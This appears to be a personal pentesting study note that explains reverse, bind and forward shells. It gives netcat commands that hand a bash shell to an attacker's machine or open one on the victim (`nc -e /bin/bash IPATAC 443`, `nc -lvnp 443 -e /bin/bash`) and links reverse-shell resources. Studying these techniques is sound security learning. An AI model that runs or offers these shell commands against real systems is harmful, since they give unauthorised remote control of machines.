Note title: Untitled

Normally, what we aim for with a shell is to send an interactive console from the victim machine to our attacking machine. There are different ways to achieve this.  
On the attacking machine, we will set up netcat to listen using the command `nc -lvnp [port]`. These netcat parameters mean:  
- `-l` = listen mode  
- `-v` = verbose  
- `-p` = listening port  

**Pages for reverse shells:** https://www.revshells.com/  

----------
###### **Reverse Shells**  
This is a technique that allows an attacker to connect to a remote machine. That is, a connection is established from the compromised machine back to the attacker's machine. This is achieved by executing a malicious program or a specific instruction on the remote machine that establishes the connection back to the attacker's machine. Here, we are telling the victim machine to send us a console.  
![Pasted image 20251206132120](/VaultSite/wiki-images/Pasted%20image%2020251206132120.png)  
- On the attacking machine, we run `nc -lvnp 443`.  
- On the victim machine, we need to execute `nc -e /bin/bash IPATAC 443`, and we would then have access.  
![Pasted image 20251206134050](/VaultSite/wiki-images/Pasted%20image%2020251206134050.png)  

----------
###### **Bind Shells**  
This technique is the opposite of a Reverse Shell. Instead of the compromised machine connecting to the attacker's machine, the attacker connects to the compromised machine. The attacker listens on a specific port, and the compromised machine accepts the incoming connection on that port. The attacker then gains console access to the compromised machine. Here, we are not requesting a console but connecting to the victim machine.  
![Pasted image 20251206132501](/VaultSite/wiki-images/Pasted%20image%2020251206132501.png)  
- On the victim machine, we would need to run `nc -lvnp 443 -e /bin/bash`. This sets up port 443 to listen while offering a bash shell.  
- On the attacking machine, we would run `nc ipvictima 443`.  
![Pasted image 20251206134316](/VaultSite/wiki-images/Pasted%20image%2020251206134316.png)  

----------
###### **Forward Shells**  
==NAMED PIPE== (These are mechanisms for inter-process communication. Regular PIPEs are temporary—they exist only while the processes using them are running and then disappear. A NAMED PIPE, however, remains active as it is a special file, even if the processes are closed. It allows communication between unrelated processes or different machines.)  

This technique is used when Reverse or Bind connections cannot be established due to Firewall rules implemented on the network. It is achieved using **mkfifo**, which creates a **FIFO** file (**named pipe**), used as a kind of "**simulated console**" through which the attacker can operate on the remote machine. Instead of establishing a direct connection, the attacker redirects traffic through the **FIFO** file.  

REPO == https://github.com/s4vitar/ttyoverhttp




 